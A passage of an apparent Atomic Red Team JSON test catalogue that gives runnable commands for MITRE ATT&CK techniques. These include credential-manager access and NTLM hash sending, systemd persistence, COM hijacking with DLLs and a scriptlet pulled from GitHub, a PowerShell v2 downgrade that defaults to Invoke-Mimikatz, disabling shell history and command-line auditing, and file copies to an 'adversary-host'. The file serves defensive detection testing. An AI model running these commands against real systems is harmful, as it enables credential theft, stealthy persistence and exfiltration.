			"command": "C:\\Windows\\System32\\inetsrv\\appcmd.exe list apppool /config",
			"name": "powershell",
			"elevation_required": true
		},
		"attack_technique": "T1003",
		"phases": ["credential-access"]
	},
	{
		"name": "Dump Credential Manager using keymgr.dll and rundll32.exe",
		"auto_generated_guid": "84113186-ed3c-4d0d-8a3c-8980c86c1f4a",
		"supported_platforms": ["windows"],
		"executor": {
			"command": "rundll32.exe keymgr,KRShowKeyMgr",
			"name": "powershell",
			"elevation_required": false
		},
		"attack_technique": "T1003",
		"phases": ["credential-access"]
	},
	{
		"name": "Send NTLM Hash with RPC Test Connection",
		"auto_generated_guid": "0b207037-813c-4444-ac3f-b597cf280a67",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"custom_port": {
				"description": "Specify the custom port number",
				"type": "integer",
				"default": "1234"
			},
			"server_ip": {
				"description": "Specify the server IP address. If not specified, the loop back IP will be used",
				"type": "string",
				"default": "127.0.0.1"
			}
		},
		"executor": {
			"command": "rpcping -s #{server_ip} -e #{custom_port} -a privacy -u NTLM 1>$Null",
			"name": "powershell",
			"elevation_required": false
		},
		"attack_technique": "T1003",
		"phases": ["credential-access"]
	},
	{
		"name": "Create Systemd Service and Timer",
		"auto_generated_guid": "f4983098-bb13-44fb-9b2c-46149961807b",
		"supported_platforms": ["linux"],
		"input_arguments": {
			"path_to_systemd_service": {
				"description": "Path to systemd service unit file",
				"type": "path",
				"default": "/etc/systemd/system/art-timer.service"
			},
			"path_to_systemd_timer": {
				"description": "Path to service timer file",
				"type": "path",
				"default": "/etc/systemd/system/art-timer.timer"
			},
			"systemd_service_name": {
				"description": "Name of systemd service",
				"type": "string",
				"default": "art-timer.service"
			},
			"systemd_timer_name": {
				"description": "Name of systemd service timer",
				"type": "string",
				"default": "art-timer.timer"
			}
		},
		"executor": {
			"command": "echo \"[Unit]\" > #{path_to_systemd_service}\necho \"Description=Atomic Red Team Systemd Timer Service\" >> #{path_to_systemd_service}\necho \"[Service]\" >> #{path_to_systemd_service}\necho \"Type=simple\" >> #{path_to_systemd_service}\necho \"ExecStart=/bin/touch /tmp/art-systemd-timer-marker\" >> #{path_to_systemd_service}\necho \"[Install]\" >> #{path_to_systemd_service}\necho \"WantedBy=multi-user.target\" >> #{path_to_systemd_service}\necho \"[Unit]\" > #{path_to_systemd_timer}\necho \"Description=Executes Atomic Red Team Systemd Timer Service\" >> #{path_to_systemd_timer}\necho \"Requires=#{systemd_service_name}\" >> #{path_to_systemd_timer}\necho \"[Timer]\" >> #{path_to_systemd_timer}\necho \"Unit=#{systemd_service_name}\" >> #{path_to_systemd_timer}\necho \"OnCalendar=*-*-* *:*:00\" >> #{path_to_systemd_timer}\necho \"[Install]\" >> #{path_to_systemd_timer}\necho \"WantedBy=timers.target\" >> #{path_to_systemd_timer}\nsystemctl start #{systemd_timer_name}\nsystemctl enable #{systemd_timer_name}\nsystemctl daemon-reload\n",
			"cleanup_command": "systemctl stop #{systemd_timer_name}\nsystemctl disable #{systemd_timer_name}\nrm #{path_to_systemd_service}\nrm #{path_to_systemd_timer}\nsystemctl daemon-reload\n",
			"name": "bash",
			"elevation_required": false
		},
		"attack_technique": "T1053.006",
		"phases": ["execution", "persistence", "privilege-escalation"]
	},
	{
		"name": "Create a user level transient systemd service and timer",
		"auto_generated_guid": "3de33f5b-62e5-4e63-a2a0-6fd8808c80ec",
		"supported_platforms": ["linux"],
		"dependency_executor_name": "sh",
		"dependencies": [
			{
				"description": "Check if systemd-run exists on the machine\n",
				"prereq_command": "if [ -x \"$(command -v systemd-run)\" ]; then exit 0; else exit 1; fi;\n",
				"get_prereq_command": "echo \"Install systemd on the machine.\"; exit 1;\n"
			}
		],
		"executor": {
			"elevation_required": false,
			"command": "systemd-run --user --unit=Atomic-Red-Team --on-calendar '*:0/1' /bin/sh -c 'echo \"$(date) $(whoami)\" >>/tmp/log'\n",
			"cleanup_command": "systemctl --user stop Atomic-Red-Team.service\nsystemctl --user stop Atomic-Red-Team.timer\nrm /tmp/log\n",
			"name": "sh"
		},
		"attack_technique": "T1053.006",
		"phases": ["execution", "persistence", "privilege-escalation"]
	},
	{
		"name": "Create a system level transient systemd service and timer",
		"auto_generated_guid": "d3eda496-1fc0-49e9-aff5-3bec5da9fa22",
		"supported_platforms": ["linux"],
		"dependency_executor_name": "sh",
		"dependencies": [
			{
				"description": "Check if systemd-run exists on the machine\n",
				"prereq_command": "if [ -x \"$(command -v systemd-run)\" ]; then exit 0; else exit 1; fi;\n",
				"get_prereq_command": "echo \"Install systemd on the machine.\"; exit 1;\n"
			}
		],
		"executor": {
			"elevation_required": true,
			"command": "systemd-run --unit=Atomic-Red-Team --on-calendar '*:0/1' /bin/sh -c 'echo \"$(date) $(whoami)\" >>/tmp/log'\n",
			"cleanup_command": "systemctl stop Atomic-Red-Team.service\nsystemctl stop Atomic-Red-Team.timer\nrm /tmp/log\n",
			"name": "sh"
		},
		"attack_technique": "T1053.006",
		"phases": ["execution", "persistence", "privilege-escalation"]
	},
	{
		"name": "ESXi - Change VIB acceptance level to CommunitySupported via PowerCLI",
		"auto_generated_guid": "062f92c9-28b1-4391-a5f8-9d8ca6852091",
		"supported_platforms": ["linux"],
		"input_arguments": {
			"vm_host": {
				"description": "Specify the host name of the ESXi Server",
				"type": "string",
				"default": "atomic.local"
			},
			"vm_user": {
				"description": "Specify the privilege user account on ESXi Server",
				"type": "string",
				"default": "root"
			},
			"vm_pass": {
				"description": "Specify the privilege user password on ESXi Server",
				"type": "string",
				"default": "pass"
			}
		},
		"dependency_executor_name": "powershell",
		"dependencies": [
			{
				"description": "Check if VMWARE PowerCLI PowerShell Module is installed.\n",
				"prereq_command": "$RequiredModule = Get-Module -Name VMware.PowerCLI -ListAvailable\nif (-not $RequiredModule) {exit 1}\n",
				"get_prereq_command": "Install-Module -Name VMware.PowerCLI -Confirm:$false\n"
			}
		],
		"executor": {
			"command": "Set-PowerCLIConfiguration -InvalidCertificateAction Ignore -ParticipateInCEIP:$false -Confirm:$false \nConnect-VIServer -Server #{vm_host} -User #{vm_user} -Password #{vm_pass}\n(Get-EsxCli -VMHost #{vm_host} -V2).software.acceptance.set.Invoke(@{level = \"CommunitySupported\"})\nDisconnect-VIServer -Confirm:$false\n",
			"name": "powershell",
			"elevation_required": true
		},
		"attack_technique": "T1562.010",
		"phases": ["defense-evasion"]
	},
	{
		"name": "ESXi - Change VIB acceptance level to CommunitySupported via ESXCLI",
		"auto_generated_guid": "14d55b96-b2f5-428d-8fed-49dc4d9dd616",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"vm_host": {
				"description": "Specify the host name of the ESXi Server",
				"type": "string",
				"default": "atomic.local"
			},
			"vm_user": {
				"description": "Specify the privilege user account on ESXi Server",
				"type": "string",
				"default": "root"
			},
			"vm_pass": {
				"description": "Specify the privilege user password on ESXi Server",
				"type": "string",
				"default": "pass"
			},
			"plink_file": {
				"description": "Path to plink",
				"type": "path",
				"default": "PathToAtomicsFolder\\..\\ExternalPayloads\\plink.exe"
			},
			"cli_script": {
				"description": "Path to script with commands to change acceptance level",
				"type": "path",
				"default": "PathToAtomicsFolder\\T1562.010\\src\\esx_community_supported.txt"
			}
		},
		"dependency_executor_name": "powershell",
		"dependencies": [
			{
				"description": "Check if plink is available.\n",
				"prereq_command": "if (Test-Path \"#{plink_file}\") {exit 0} else {exit 1}\n",
				"get_prereq_command": "New-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nInvoke-WebRequest \"https://the.earth.li/~sgtatham/putty/latest/w64/plink.exe\" -OutFile \"#{plink_file}\"\n"
			}
		],
		"executor": {
			"command": "echo \"\" | \"#{plink_file}\" \"#{vm_host}\" -ssh  -l \"#{vm_user}\" -pw \"#{vm_pass}\" -m \"#{cli_script}\"\n",
			"name": "command_prompt",
			"elevation_required": false
		},
		"attack_technique": "T1562.010",
		"phases": ["defense-evasion"]
	},
	{
		"name": "PowerShell Version 2 Downgrade",
		"auto_generated_guid": "47c96489-2f55-4774-a6df-39faff428f6f",
		"supported_platforms": ["windows"],
		"dependencies": [
			{
				"description": "Check if Version 2 is installed.",
				"prereq_command": "$v2_installed = PowerShell -version 2 -command '$PSVersionTable.PSVersion.Major'\nif (-not $v2_installed) {exit 1} else {exit 0}\n",
				"get_prereq_command": "echo \"Manually install PowerShell Version 2\"\n"
			}
		],
		"executor": {
			"command": "PowerShell -version 2 -command '#{v2_command}'",
			"name": "powershell",
			"elevation_required": false
		},
		"input_arguments": {
			"v2_command": {
				"description": "Specify the command to execute with Version 2",
				"type": "string",
				"default": "Invoke-Mimikatz"
			}
		},
		"attack_technique": "T1562.010",
		"phases": ["defense-evasion"]
	},
	{
		"name": "COM Hijacking - InprocServer32",
		"auto_generated_guid": "48117158-d7be-441b-bc6a-d9e36e47b52b",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"clsid_threading": {
				"description": "Threading Model",
				"type": "string",
				"default": "Apartment"
			},
			"dllpath": {
				"description": "Path to the DLL.",
				"type": "string",
				"default": "PathToAtomicsFolder\\..\\ExternalPayloads\\AtomicTest.dll"
			},
			"clsid": {
				"description": "Class ID to hijack.",
				"type": "string",
				"default": "{B5F8350B-0548-48B1-A6EE-88BD00B4A5E7}"
			},
			"clsid_description": {
				"description": "Description for CLSID",
				"type": "string",
				"default": "MSAA AccPropServices"
			}
		},
		"dependency_executor_name": "powershell",
		"dependencies": [
			{
				"description": "DLL For testing",
				"prereq_command": "if (Test-Path \"#{dllpath}\") {exit 0} else {exit 1}",
				"get_prereq_command": "New-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1546.015/bin/AtomicTest.dll\" -OutFile \"#{dllpath}\"\n"
			}
		],
		"executor": {
			"command": "New-Item -Path 'HKCU:\\SOFTWARE\\Classes\\CLSID\\#{clsid}' -Value '#{clsid_description}'\nNew-Item -Path 'HKCU:\\SOFTWARE\\Classes\\CLSID\\#{clsid}\\InprocServer32' -Value \"#{dllpath}\"\nNew-ItemProperty -Path 'HKCU:\\SOFTWARE\\Classes\\CLSID\\#{clsid}\\InprocServer32' -Name 'ThreadingModel' -Value '#{clsid_threading}' -PropertyType \"String\"\nStart-Process -FilePath \"C:\\Windows\\System32\\RUNDLL32.EXE\" -ArgumentList '-sta #{clsid}'",
			"cleanup_command": "Remove-Item -Path 'HKCU:\\SOFTWARE\\Classes\\CLSID\\#{clsid}' -Recurse -ErrorAction Ignore",
			"name": "powershell",
			"elevation_required": false
		},
		"attack_technique": "T1546.015",
		"phases": ["persistence", "privilege-escalation"]
	},
	{
		"name": "Powershell Execute COM Object",
		"auto_generated_guid": "752191b1-7c71-445c-9dbe-21bb031b18eb",
		"supported_platforms": ["windows"],
		"executor": {
			"command": "$o= [activator]::CreateInstance([type]::GetTypeFromCLSID(\"9BA05972-F6A8-11CF-A442-00A0C90A8F39\"))\n$item = $o.Item()\n$item.Document.Application.ShellExecute(\"cmd.exe\",\"/c calc.exe\",\"C:\\windows\\system32\",$null,0)\n",
			"cleanup_command": "Get-Process -Name \"*calc\" | Stop-Process\n",
			"name": "powershell",
			"elevation_required": false
		},
		"attack_technique": "T1546.015",
		"phases": ["persistence", "privilege-escalation"]
	},
	{
		"name": "COM Hijacking with RunDLL32 (Local Server Switch)",
		"auto_generated_guid": "123520cc-e998-471b-a920-bd28e3feafa0",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"clsid_threading": {
				"description": "Threading Model",
				"type": "string",
				"default": "Both"
			},
			"dll_path": {
				"description": "Path to the DLL.",
				"type": "string",
				"default": "PathToAtomicsFolder\\..\\ExternalPayloads\\T1546.015_calc.dll"
			},
			"clsid": {
				"description": "Class ID to hijack.",
				"type": "string",
				"default": "{B5F8350B-0548-48B1-A6EE-88BD00B4A5E7}"
			},
			"clsid_description": {
				"description": "Description for CLSID",
				"type": "string",
				"default": "MSAA AccPropServices"
			}
		},
		"dependency_executor_name": "powershell",
		"dependencies": [
			{
				"description": "DLL For testing",
				"prereq_command": "if (Test-Path \"#{dll_path}\") {exit 0} else {exit 1}",
				"get_prereq_command": "New-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1546.015/bin/T1546.015_calc.dll\" -OutFile \"#{dll_path}\"\n"
			}
		],
		"executor": {
			"command": "New-Item -Path 'HKCU:\\SOFTWARE\\Classes\\CLSID\\#{clsid}' -Value '#{clsid_description}'\nNew-Item -Path 'HKCU:\\SOFTWARE\\Classes\\CLSID\\#{clsid}\\InprocServer32' -Value \"#{dll_path}\"\nNew-ItemProperty -Path 'HKCU:\\SOFTWARE\\Classes\\CLSID\\#{clsid}\\InprocServer32' -Name 'ThreadingModel' -Value '#{clsid_threading}' -PropertyType \"String\"\nStart-Process -FilePath \"C:\\Windows\\System32\\RUNDLL32.EXE\" -ArgumentList '-localserver #{clsid}'",
			"cleanup_command": "Remove-Item -Path 'HKCU:\\SOFTWARE\\Classes\\CLSID\\#{clsid}' -Recurse -ErrorAction Ignore",
			"name": "powershell",
			"elevation_required": false
		},
		"attack_technique": "T1546.015",
		"phases": ["persistence", "privilege-escalation"]
	},
	{
		"name": "COM hijacking via TreatAs",
		"auto_generated_guid": "33eacead-f117-4863-8eb0-5c6304fbfaa9",
		"supported_platforms": ["windows"],
		"executor": {
			"command": "reg add \"HKEY_CURRENT_USER\\SOFTWARE\\Classes\\AtomicTest\" /ve /T REG_SZ /d \"AtomicTest\" /f\nreg add \"HKEY_CURRENT_USER\\SOFTWARE\\Classes\\AtomicTest.1.00\" /ve /T REG_SZ /d \"AtomicTest\" /f\nreg add \"HKEY_CURRENT_USER\\SOFTWARE\\Classes\\AtomicTest\\CLSID\" /ve /T REG_SZ /d \"{00000001-0000-0000-0000-0000FEEDACDC}\" /f\nreg add \"HKEY_CURRENT_USER\\SOFTWARE\\Classes\\AtomicTest.1.00\\CLSID\" /ve /T REG_SZ /d \"{00000001-0000-0000-0000-0000FEEDACDC}\" /f\nreg add \"HKEY_CURRENT_USER\\SOFTWARE\\Classes\\CLSID\\{00000001-0000-0000-0000-0000FEEDACDC}\" /f\nreg add \"HKEY_CURRENT_USER\\SOFTWARE\\Classes\\CLSID\\{00000001-0000-0000-0000-0000FEEDACDC}\" /ve /T REG_SZ /d \"AtomicTest\" /f\nreg add \"HKEY_CURRENT_USER\\SOFTWARE\\Classes\\CLSID\\{00000001-0000-0000-0000-0000FEEDACDC}\\InprocServer32\" /ve /T REG_SZ /d \"C:\\WINDOWS\\system32\\scrobj.dll\" /f\nreg add \"HKEY_CURRENT_USER\\SOFTWARE\\Classes\\CLSID\\{00000001-0000-0000-0000-0000FEEDACDC}\\InprocServer32\" /v \"ThreadingModel\" /T REG_SZ /d \"Apartment\" /f\nreg add \"HKEY_CURRENT_USER\\SOFTWARE\\Classes\\CLSID\\{00000001-0000-0000-0000-0000FEEDACDC}\\ProgID\" /ve /T REG_SZ /d \"AtomicTest\" /f\nreg add \"HKEY_CURRENT_USER\\SOFTWARE\\Classes\\CLSID\\{00000001-0000-0000-0000-0000FEEDACDC}\\ScriptletURL\" /ve /T REG_SZ /d \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1546.015/src/TreatAs.sct\" /f\nreg add \"HKEY_CURRENT_USER\\SOFTWARE\\Classes\\CLSID\\{00000001-0000-0000-0000-0000FEEDACDC}\\VersionIndependentProgID\" /ve /T REG_SZ /d \"AtomicTest\" /f\n\nreg add \"HKEY_CURRENT_USER\\SOFTWARE\\Classes\\CLSID\\{97D47D56-3777-49FB-8E8F-90D7E30E1A1E}\" /f\nreg add \"HKEY_CURRENT_USER\\SOFTWARE\\Classes\\CLSID\\{97D47D56-3777-49FB-8E8F-90D7E30E1A1E}\\TreatAs\" /ve /T REG_SZ /d \"{00000001-0000-0000-0000-0000FEEDACDC}\" /f\n\nrundll32.exe -sta \"AtomicTest\" ",
			"cleanup_command": "reg delete \"HKEY_CURRENT_USER\\SOFTWARE\\Classes\\AtomicTest\" /f\nreg delete \"HKEY_CURRENT_USER\\SOFTWARE\\Classes\\CLSID\\{00000001-0000-0000-0000-0000FEEDACDC}\" /f\nreg delete \"HKEY_CURRENT_USER\\SOFTWARE\\Classes\\CLSID\\{97D47D56-3777-49FB-8E8F-90D7E30E1A1E}\" /f",
			"name": "powershell",
			"elevation_required": false
		},
		"attack_technique": "T1546.015",
		"phases": ["persistence", "privilege-escalation"]
	},
	{
		"name": "Disable history collection",
		"auto_generated_guid": "4eafdb45-0f79-4d66-aa86-a3e2c08791f5",
		"supported_platforms": ["linux", "macos"],
		"input_arguments": {
			"evil_command": {
				"description": "Command to run after shell history collection is disabled",
				"type": "string",
				"default": "whoami"
			}
		},
		"executor": {
			"command": "export HISTCONTROL=ignoreboth\n#{evil_command}\n",
			"name": "sh",
			"elevation_required": false
		},
		"attack_technique": "T1562.003",
		"phases": ["defense-evasion"]
	},
	{
		"name": "Disable history collection (freebsd)",
		"auto_generated_guid": "cada55b4-8251-4c60-819e-8ec1b33c9306",
		"supported_platforms": ["linux"],
		"input_arguments": {
			"evil_command": {
				"description": "Command to run after shell history collection is disabled",
				"type": "string",
				"default": "whoami"
			}
		},
		"executor": {
			"command": "export HISTSIZE=0\n#{evil_command}\n",
			"name": "sh",
			"elevation_required": false
		},
		"attack_technique": "T1562.003",
		"phases": ["defense-evasion"]
	},
	{
		"name": "Mac HISTCONTROL",
		"auto_generated_guid": "468566d5-83e5-40c1-b338-511e1659628d",
		"supported_platforms": ["macos", "linux"],
		"executor": {
			"steps": "1. export HISTCONTROL=ignoreboth\n2. echo export \"HISTCONTROL=ignoreboth\" >> ~/.bash_profile\n3. ls\n4. whoami > recon.txt\n",
			"name": "manual",
			"elevation_required": false
		},
		"attack_technique": "T1562.003",
		"phases": ["defense-evasion"]
	},
	{
		"name": "Clear bash history",
		"auto_generated_guid": "878794f7-c511-4199-a950-8c28b3ed8e5b",
		"supported_platforms": ["linux"],
		"executor": {
			"name": "bash",
			"elevation_required": false,
			"command": "cp $HISTFILE $HISTFILE.OLD\nif ((${#HISTFILE[@]})); then echo $HISTFILE; fi\necho \"\" > $HISTFILE\nif [ $(wc -c <$HISTFILE) -gt 1 ]; then echo \"$HISTFILE is larger than 1k\"; fi\nls -la $HISTFILE \ncat $HISTFILE\nhistory -c \nif [ $(history |wc -l) -eq 1 ]; then echo \"History cache cleared\"; fi\n",
			"cleanup_command": "mv -f $HISTFILE.OLD $HISTFILE \n"
		},
		"attack_technique": "T1562.003",
		"phases": ["defense-evasion"]
	},
	{
		"name": "Setting the HISTCONTROL environment variable",
		"auto_generated_guid": "10ab786a-028e-4465-96f6-9e83ca6c5f24",
		"supported_platforms": ["linux"],
		"executor": {
			"name": "bash",
			"elevation_required": false,
			"command": "TEST=$(echo $HISTCONTROL)\nif [ \"$HISTCONTROL\" != \"ignoreboth\" ]; then export HISTCONTROL=\"ignoreboth\"; fi\nhistory -c \nls -la $HISTFILE # \" ls -la $HISTFILE\"\nif [ $(history |wc -l) -eq 1 ]; then echo \"ls -la is not in history cache\"; fi\n# -> ls -la is not in history cache\nif [ \"$HISTCONTROL\" != \"erasedups\" ]; then export HISTCONTROL=\"erasedups\"; fi\nhistory -c \nls -la $HISTFILE\nls -la $HISTFILE\nls -la $HISTFILE\nif [ $(history |wc -l) -eq 2 ]; then echo \"Their is only one entry for ls -la $HISTFILE\"; fi\n",
			"cleanup_command": "export HISTCONTROL=$(echo $TEST)\n"
		},
		"attack_technique": "T1562.003",
		"phases": ["defense-evasion"]
	},
	{
		"name": "Setting the HISTFILESIZE environment variable",
		"auto_generated_guid": "5cafd6c1-2f43-46eb-ac47-a5301ba0a618",
		"supported_platforms": ["linux"],
		"executor": {
			"name": "bash",
			"elevation_required": false,
			"command": "TEST=$(echo $HISTFILESIZE)\necho $HISTFILESIZE\nexport HISTFILESIZE=0\nif [ $(echo $HISTFILESIZE) -eq 0 ]; then echo \"\\$HISTFILESIZE is zero\"; fi\n# -> $HISTFILESIZE is zero\n",
			"cleanup_command": "export HISTCONTROL=$(echo $TEST)\n"
		},
		"attack_technique": "T1562.003",
		"phases": ["defense-evasion"]
	},
	{
		"name": "Setting the HISTSIZE environment variable",
		"auto_generated_guid": "386d3850-2ce7-4508-b56b-c0558922c814",
		"supported_platforms": ["linux"],
		"executor": {
			"name": "sh",
			"elevation_required": false,
			"command": "echo $HISTSIZE\nexport HISTSIZE=0\nif [ $(echo $HISTSIZE) -eq 0 ]; then echo \"\\$HISTSIZE is zero\"; fi\n# -> $HISTSIZE is zero\n",
			"cleanup_command": "export HISTSIZE=100\n"
		},
		"attack_technique": "T1562.003",
		"phases": ["defense-evasion"]
	},
	{
		"name": "Setting the HISTFILE environment variable",
		"auto_generated_guid": "b3dacb6c-a9e3-44ec-bf87-38db60c5cad1",
		"supported_platforms": ["linux"],
		"executor": {
			"name": "bash",
			"elevation_required": false,
			"command": "TEST=$(echo $HISTFILE)\necho $HISTFILE\nexport HISTFILE=\"/dev/null\"\nif [ $(echo $HISTFILE) == \"/dev/null\" ]; then echo \"\\$HISTFILE is /dev/null\"; fi\n# -> $HISTFILE is /dev/null\n",
			"cleanup_command": "export HISTFILE=$(echo $TEST)\n"
		},
		"attack_technique": "T1562.003",
		"phases": ["defense-evasion"]
	},
	{
		"name": "Setting the HISTFILE environment variable (freebsd)",
		"auto_generated_guid": "f7308845-6da8-468e-99f2-4271f2f5bb67",
		"supported_platforms": ["linux"],
		"executor": {
			"name": "sh",
			"elevation_required": false,
			"command": "echo $HISTFILE\nexport HISTFILE=\"/dev/null\"\nif [ $(echo $HISTFILE) == \"/dev/null\" ]; then echo \"\\$HISTFILE is /dev/null\"; fi\n# -> $HISTFILE is /dev/null\n",
			"cleanup_command": "export HISTFILE=~/.sh_history\n"
		},
		"attack_technique": "T1562.003",
		"phases": ["defense-evasion"]
	},
	{
		"name": "Setting the HISTIGNORE environment variable",
		"auto_generated_guid": "f12acddb-7502-4ce6-a146-5b62c59592f1",
		"supported_platforms": ["linux"],
		"executor": {
			"name": "bash",
			"elevation_required": false,
			"command": "if ((${#HISTIGNORE[@]})); then echo \"\\$HISTIGNORE = $HISTIGNORE\"; else export HISTIGNORE='ls*:rm*:ssh*'; echo \"\\$HISTIGNORE = $HISTIGNORE\"; fi\n# -> $HISTIGNORE = ls*:rm*:ssh*\nhistory -c \nls -la $HISTFILE\nls -la ~/.bash_logout\nif [ $(history |wc -l) -eq 1 ]; then echo \"ls commands are not in history\"; fi\n# -> ls commands are not in history\nunset HISTIGNORE\n\nif ((${#HISTIGNORE[@]})); then echo \"\\$HISTIGNORE = $HISTIGNORE\"; else export HISTIGNORE='*'; echo \"\\$HISTIGNORE = $HISTIGNORE\"; fi\n# -> $HISTIGNORE = *\nhistory -c \nwhoami\ngroups\nif [ $(history |wc -l) -eq 0 ]; then echo \"History cache is empty\"; fi\n# -> History cache is empty\n",
			"cleanup_command": "unset HISTIGNORE\n"
		},
		"attack_technique": "T1562.003",
		"phases": ["defense-evasion"]
	},
	{
		"name": "Disable Windows Command Line Auditing using reg.exe",
		"auto_generated_guid": "1329d5ab-e10e-4e5e-93d1-4d907eb656e5",
		"supported_platforms": ["windows"],
		"executor": {
			"name": "command_prompt",
			"elevation_required": true,
			"command": "reg add HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\Audit /v ProcessCreationIncludeCmdLine_Enabled /t REG_DWORD /d 0 /f\n",
			"cleanup_command": "reg add HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\Audit /v ProcessCreationIncludeCmdLine_Enabled /t REG_DWORD /d 1 /f\n"
		},
		"attack_technique": "T1562.003",
		"phases": ["defense-evasion"]
	},
	{
		"name": "Disable Windows Command Line Auditing using Powershell Cmdlet",
		"auto_generated_guid": "95f5c72f-6dfe-45f3-a8c1-d8faa07176fa",
		"supported_platforms": ["windows"],
		"executor": {
			"name": "powershell",
			"elevation_required": true,
			"command": "New-ItemProperty -Path \"HKLM:Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\Audit\" -Name \"ProcessCreationIncludeCmdLine_Enabled\" -Value 0 -PropertyType DWORD -Force -ErrorAction Ignore\n",
			"cleanup_command": "New-ItemProperty -Path \"HKLM:Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\Audit\" -Name \"ProcessCreationIncludeCmdLine_Enabled\" -Value 1 -PropertyType DWORD -Force -ErrorAction Ignore\n"
		},
		"attack_technique": "T1562.003",
		"phases": ["defense-evasion"]
	},
	{
		"name": "rsync remote file copy (push)",
		"auto_generated_guid": "0fc6e977-cb12-44f6-b263-2824ba917409",
		"supported_platforms": ["linux", "macos"],
		"input_arguments": {
			"remote_path": {
				"description": "Remote path to receive rsync",
				"type": "path",
				"default": "/tmp/victim-files"
			},
			"remote_host": {
				"description": "Remote host to copy toward",
				"type": "string",
				"default": "victim-host"
			},
			"local_path": {
				"description": "Path of folder to copy",
				"type": "path",
				"default": "/tmp/adversary-rsync/"
			},
			"username": {
				"description": "User account to authenticate on remote host",
				"type": "string",
				"default": "victim"
			}
		},
		"dependency_executor_name": "sh",
		"dependencies": [
			{
				"description": "rsync must be installed on the machine \n",
				"prereq_command": "if [ -x \"$(command -v rsync)\" ]; then exit 0; else exit 1; fi\n",
				"get_prereq_command": "(pkg install -y rsync)||(sudo apt-get -y install rsync)\n"
			}
		],
		"executor": {
			"command": "rsync -r #{local_path} #{username}@#{remote_host}:#{remote_path}\n",
			"name": "sh",
			"elevation_required": true
		},
		"attack_technique": "T1105",
		"phases": ["command-and-control"]
	},
	{
		"name": "rsync remote file copy (pull)",
		"auto_generated_guid": "3180f7d5-52c0-4493-9ea0-e3431a84773f",
		"supported_platforms": ["linux", "macos"],
		"input_arguments": {
			"remote_path": {
				"description": "Path of folder to copy",
				"type": "path",
				"default": "/tmp/adversary-rsync/"
			},
			"remote_host": {
				"description": "Remote host to copy from",
				"type": "string",
				"default": "adversary-host"
			},
			"local_path": {
				"description": "Local path to receive rsync",
				"type": "path",
				"default": "/tmp/victim-files"
			},
			"username": {
				"description": "User account to authenticate on remote host",
				"type": "string",
				"default": "adversary"
			}
		},
		"dependency_executor_name": "sh",
		"dependencies": [
			{
				"description": "rsync must be installed on the machine \n",
				"prereq_command": "if [ -x \"$(command -v rsync)\" ]; then exit 0; else exit 1; fi\n",
				"get_prereq_command": "(pkg install -y rsync)||(sudo apt-get -y install rsync)\n"
			}
		],
		"executor": {
			"command": "rsync -r #{username}@#{remote_host}:#{remote_path} #{local_path}\n",
			"name": "sh",
			"elevation_required": false
		},
		"attack_technique": "T1105",
		"phases": ["command-and-control"]
	},
	{
		"name": "scp remote file copy (push)",
		"auto_generated_guid": "83a49600-222b-4866-80a0-37736ad29344",
		"supported_platforms": ["linux", "macos"],
		"input_arguments": {
			"remote_path": {
				"description": "Remote path to receive scp",
				"type": "path",
				"default": "/tmp/victim-files/"
			},
			"local_file": {
				"description": "Path of file to copy",
				"type": "path",
				"default": "/tmp/adversary-scp"
			},
			"remote_host": {
				"description": "Remote host to copy toward",
				"type": "string",
				"default": "victim-host"
			},
			"username": {
				"description": "User account to authenticate on remote host",
				"type": "string",
				"default": "victim"
			}
		},
		"executor": {
			"command": "scp #{local_file} #{username}@#{remote_host}:#{remote_path}\n",
			"name": "sh",
			"elevation_required": false
		},
		"attack_technique": "T1105",
		"phases": ["command-and-control"]
	},
	{
		"name": "scp remote file copy (pull)",
		"auto_generated_guid": "b9d22b9a-9778-4426-abf0-568ea64e9c33",
		"supported_platforms": ["linux", "macos"],
		"input_arguments": {
			"remote_host": {
				"description": "Remote host to copy from",
				"type": "string",
				"default": "adversary-host"
			},
			"local_path": {
				"description": "Local path to receive scp",
				"type": "path",
				"default": "/tmp/victim-files/"
			},
			"remote_file": {
				"description": "Path of file to copy",
				"type": "path",
				"default": "/tmp/adversary-scp"
			},
			"username": {
				"description": "User account to authenticate on remote host",
				"type": "string",
				"default": "adversary"
			}
		},
		"executor": {
			"command": "scp #{username}@#{remote_host}:#{remote_file} #{local_path}\n",
			"name": "sh",
			"elevation_required": false
		},
		"attack_technique": "T1105",
		"phases": ["command-and-control"]
	},
	{
		"name": "sftp remote file copy (push)",
		"auto_generated_guid": "f564c297-7978-4aa9-b37a-d90477feea4e",
		"supported_platforms": ["linux", "macos"],
		"input_arguments": {
			"remote_path": {
				"description": "Remote path to receive sftp",
				"type": "path",
				"default": "/tmp/victim-files/"
			},
			"local_file": {
				"description": "Path of file to copy",
				"type": "path",
				"default": "/tmp/adversary-sftp"
			},
			"remote_host": {
				"description": "Remote host to copy toward",
				"type": "string",
				"default": "victim-host"
			},
			"username": {
				"description": "User account to authenticate on remote host",
				"type": "string",
				"default": "victim"
			}
		},
		"executor": {
			"command": "sftp #{username}@#{remote_host}:#{remote_path} <<< $'put #{local_file}'\n",
			"name": "sh",
			"elevation_required": false
		},
		"attack_technique": "T1105",
		"phases": ["command-and-control"]
	},
	{
		"name": "sftp remote file copy (pull)",
		"auto_generated_guid": "0139dba1-f391-405e-a4f5-f3989f2c88ef",
		"supported_platforms": ["linux", "macos"],
		"input_arguments": {
			"remote_host": {
				"description": "Remote host to copy from",
				"type": "string",
				"default": "adversary-host"
			},
			"local_path": {
				"description": "Local path to receive sftp",
				"type": "path",
				"default": "/tmp/victim-files/"
			},
			"remote_file": {
				"description": "Path of file to copy",
				"type": "path",
				"default": "/tmp/adversary-sftp"
			},
			"username": {
